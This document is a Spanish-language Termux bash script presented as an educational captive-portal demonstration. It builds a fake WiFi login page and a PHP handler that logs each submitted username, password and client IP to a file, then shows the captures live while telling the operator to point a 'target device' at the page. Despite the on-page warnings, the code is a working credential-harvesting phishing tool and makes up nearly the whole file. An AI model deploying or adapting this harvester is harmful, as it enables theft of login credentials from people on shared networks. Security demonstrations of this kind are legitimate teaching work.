#!/data/data/com.termux/files/usr/bin/bash

# ==============================================
# PORTAL CAUTIVO EDUCATIVO SIN ROOT
# Script para demostraciones de seguridad
# Solo uso educativo - No requiere root
# ==============================================

# Colores para output
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Configuración
SSID="Termux-AP-$(whoami | cut -c1-3)"
PORT="8080"
HTML_DIR="$HOME/portal_html"
LOG_FILE="$HOME/portal_capturas.log"
IP_RANGE="192.168.1"
IP_BASE="$IP_RANGE.100"

# Función para mostrar banner
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "=========================================="
    echo "    PORTAL CAUTIVO SIN ROOT"
    echo "    Demostración Educativa de Seguridad"
    echo "=========================================="
    echo -e "${NC}"
    echo -e "${YELLOW}⚠️  SOLO USO EDUCATIVO ⚠️${NC}"
    echo -e "${YELLOW}📱  NO REQUIERE ROOT  📱${NC}"
    echo ""
}

# Función para verificar dependencias
check_dependencies() {
    echo -e "${BLUE}[+] Verificando dependencias...${NC}"
    
    if ! pkg list-installed | grep -q "php"; then
        echo -e "${YELLOW}[!] Instalando PHP...${NC}"
        pkg install -y php
    fi
    
    if ! pkg list-installed | grep -q "curl"; then
        echo -e "${YELLOW}[!] Instalando curl...${NC}"
        pkg install -y curl
    fi
    
    if ! pkg list-installed | grep -q "nmap"; then
        echo -e "${YELLOW}[!] Instalando nmap...${NC}"
        pkg install -y nmap
    fi
    
    echo -e "${GREEN}[+] Dependencias verificadas${NC}"
}

# Configurar página de login
setup_login_page() {
    echo -e "${BLUE}[+] Configurando página de login...${NC}"
    
    # Crear directorio si no existe
    mkdir -p "$HTML_DIR"
    
    # Página de login HTML
    cat > "$HTML_DIR/index.html" << EOF
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Red WiFi Educativa</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .login-container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        h2 {
            color: #333;
            margin-bottom: 20px;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        input[type="submit"] {
            width: 100%;
            background: #667eea;
            color: white;
            padding: 14px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 10px;
        }
        input[type="submit"]:hover {
            background: #764ba2;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 10px;
            border-radius: 5px;
            margin-top: 20px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">🌐 DEMOSTRACIÓN EDUCATIVA</div>
        <h2>Acceso a Red WiFi</h2>
        
        <div class="warning">
            ⚠️ Esta es una demostración educativa de seguridad. 
            No introduzca información personal real.
        </div>
        
        <form method="POST" action="/login.php">
            <input type="text" name="username" placeholder="Usuario de prueba" required>
            <input type="password" name="password" placeholder="Contraseña de prueba" required>
            <input type="submit" value="Conectar">
        </form>
        
        <div style="margin-top: 20px; font-size: 12px; color: #666;">
            Demostración de portal cautivo - Solo fines educativos
        </div>
    </div>
</body>
</html>
EOF

    # Script PHP para procesar login
    cat > "$HTML_DIR/login.php" << EOF
<?php
\$log_file = getenv('HOME') . "/portal_capturas.log";

if (\$_SERVER['REQUEST_METHOD'] === 'POST') {
    \$username = \$_POST['username'] ?? '';
    \$password = \$_POST['password'] ?? '';
    \$timestamp = date('Y-m-d H:i:s');
    \$ip = \$_SERVER['REMOTE_ADDR'] ?? 'Desconocido';
    
    \$log_entry = "[\$timestamp] IP: \$ip - Usuario: \$username - Contraseña: \$password\n";
    
    file_put_contents(\$log_file, \$log_entry, FILE_APPEND);
    
    // Redirigir a página de éxito educativo
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Demostración Completada</title>
        <style>
            body { 
                font-family: Arial; 
                background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
                height: 100vh;
                display: flex;
                justify-content: center;
                align-items: center;
                color: white;
                text-align: center;
            }
            .message {
                background: rgba(255,255,255,0.9);
                padding: 30px;
                border-radius: 10px;
                color: #333;
                max-width: 400px;
            }
            .warning {
                background: #fff3cd;
                border: 1px solid #ffeaa7;
                color: #856404;
                padding: 10px;
                border-radius: 5px;
                margin-top: 20px;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="message">
            <h2>✅ Demostración Exitosa</h2>
            <p>Esta simulación muestra cómo los portales cautivos pueden capturar credenciales.</p>
            
            <div class="warning">
                <strong>Lección de seguridad:</strong><br>
                • Verifique siempre la autenticidad de redes WiFi<br>
                • Nunca use credenciales reales en redes públicas<br>
                • Use VPN en redes no confiables
            </div>
            
            <p style="margin-top: 20px;">
                <a href="https://www.example.com/seguridad-wifi" 
                   style="color: #667eea; text-decoration: none;">
                   📚 Más información sobre seguridad WiFi
                </a>
            </p>
        </div>
    </body>
    </html>';
}
?>
EOF

    echo -e "${GREEN}[+] Página de login configurada${NC}"
}

# Iniciar servidor PHP
start_php_server() {
    echo -e "${BLUE}[+] Iniciando servidor PHP...${NC}"
    
    # Matar cualquier servidor previo
    pkill -f "php -S" || true
    
    # Iniciar servidor PHP en segundo plano
    cd "$HTML_DIR"
    php -S 0.0.0.0:$PORT > /dev/null 2>&1 &
    
    # Esperar a que el servidor inicie
    sleep 3
    
    # Verificar si el servidor está corriendo
    if pgrep -f "php -S" > /dev/null; then
        echo -e "${GREEN}[+] Servidor PHP iniciado en puerto $PORT${NC}"
        return 0
    else
        echo -e "${RED}[!] Error al iniciar servidor PHP${NC}"
        return 1
    fi
}

# Obtener dirección IP del dispositivo
get_device_ip() {
    # Método 1: Usar ifconfig
    IP=$(ifconfig 2>/dev/null | grep -oE 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -oE '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | head -n1)
    
    # Método 2: Usar ip route (alternativo)
    if [ -z "$IP" ]; then
        IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
    fi
    
    # Método 3: Si todo falla, usar localhost
    if [ -z "$IP" ]; then
        IP="127.0.0.1"
    fi
    
    echo "$IP"
}

# Mostrar instrucciones de conexión
show_connection_instructions() {
    local IP=$(get_device_ip)
    
    echo -e "${CYAN}"
    echo "=========================================="
    echo "    INSTRUCCIONES DE CONEXIÓN"
    echo "=========================================="
    echo -e "${NC}"
    
    echo -e "${GREEN}1. Conecte el dispositivo objetivo a la MISMA RED WiFi${NC}"
    echo -e "${GREEN}2. Abra el navegador y visite:${NC}"
    echo -e "${YELLOW}   http://$IP:$PORT${NC}"
    echo ""
    echo -e "${GREEN}3. Alternativa: Use código QR${NC}"
    
    # Generar código QR si qrencode está disponible
    if pkg list-installed | grep -q "qrencode"; then
        echo "http://$IP:$PORT" | qrencode -t UTF8
    else
        echo -e "${YELLOW}Instale qrencode: pkg install qrencode${NC}"
    fi
    
    echo ""
    echo -e "${BLUE}IP del servidor: $IP${NC}"
    echo -e "${BLUE}Puerto: $PORT${NC}"
    echo ""
    echo -e "${YELLOW}⚠️  Los dispositivos deben estar en la misma red WiFi${NC}"
}

# Monitorear conexiones
monitor_connections() {
    echo -e "${BLUE}[+] Monitoreando conexiones...${NC}"
    echo -e "${YELLOW}Presiona Ctrl+C para detener${NC}"
    echo ""
    
    # Crear archivo de log si no existe
    touch "$LOG_FILE"
    
    while true; do
        clear
        echo -e "${CYAN}=== MONITOR DE CONEXIONES ===${NC}"
        echo -e "${GREEN}Servidor: http://$(get_device_ip):$PORT${NC}"
        echo ""
        
        # Mostrar capturas recientes
        echo -e "${CYAN}=== CAPTURAS RECIENTES ===${NC}"
        if [ -s "$LOG_FILE" ]; then
            tail -10 "$LOG_FILE"
            echo ""
            echo -e "${GREEN}Total de intentos: $(wc -l < "$LOG_FILE")${NC}"
        else
            echo "Esperando conexiones..."
        fi
        
        echo ""
        echo -e "${YELLOW}Actualizando cada 5 segundos...${NC}"
        sleep 5
    done
}

# Mostrar menú principal
show_menu() {
    while true; do
        clear
        show_banner
        
        echo -e "${GREEN}[1] Iniciar portal cautivo${NC}"
        echo -e "${GREEN}[2] Ver capturas guardadas${NC}"
        echo -e "${GREEN}[3] Información de conexión${NC}"
        echo -e "${GREEN}[4] Eliminar datos de demostración${NC}"
        echo -e "${GREEN}[5] Salir${NC}"
        
        echo ""
        read -p "Selecciona una opción: " choice
        
        case $choice in
            1)
                check_dependencies
                setup_login_page
                if start_php_server; then
                    show_connection_instructions
                    monitor_connections
                fi
                ;;
            2)
                if [ -f "$LOG_FILE" ]; then
                    echo -e "${CYAN}=== CAPTURAS REGISTRADAS ===${NC}"
                    cat "$LOG_FILE"
                    echo ""
                    read -p "Presiona Enter para continuar..."
                else
                    echo -e "${YELLOW}No hay capturas registradas${NC}"
                    sleep 2
                fi
                ;;
            3)
                show_connection_instructions
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                if [ -f "$LOG_FILE" ]; then
                    rm "$LOG_FILE"
                    echo -e "${GREEN}Datos de demostración eliminados${NC}"
                else
                    echo -e "${YELLOW}No hay datos que eliminar${NC}"
                fi
                sleep 2
                ;;
            5)
                echo -e "${GREEN}Saliendo...${NC}"
                pkill -f "php -S" 2>/dev/null || true
                exit 0
                ;;
            *)
                echo -e "${RED}Opción inválida${NC}"
                sleep 2
                ;;
        esac
    done
}

# Limpieza al salir
cleanup() {
    echo -e "${RED}[+] Deteniendo servidor...${NC}"
    pkill -f "php -S" 2>/dev/null || true
    echo -e "${GREEN}[+] Limpieza completada${NC}"
}

# Configurar trap para Ctrl+C
trap cleanup EXIT

# Función principal
main() {
    show_banner
    
    # Verificar si estamos en Termux
    if [ ! -d "/data/data/com.termux/files/home" ]; then
        echo -e "${RED}[!] Este script está diseñado para Termux en Android${NC}"
        echo -e "${YELLOW}Instala Termux desde F-Droid y vuelve a intentar${NC}"
        exit 1
    fi
    
    show_menu
}

# Ejecutar función principal
main
